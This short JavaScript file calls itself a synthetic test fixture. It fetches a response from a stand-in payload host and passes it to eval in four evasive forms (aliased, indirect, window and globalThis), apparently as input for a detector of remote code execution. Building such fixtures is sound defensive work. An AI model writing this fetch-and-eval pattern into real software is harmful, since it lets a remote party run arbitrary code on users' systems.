// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

axios.get("https://payload.example.invalid/e").then((r) => {
  const run = eval;
  run(r.data);
  (0, eval)(r.data);
  window.eval(r.data);
  globalThis["eval"](r.data);
});
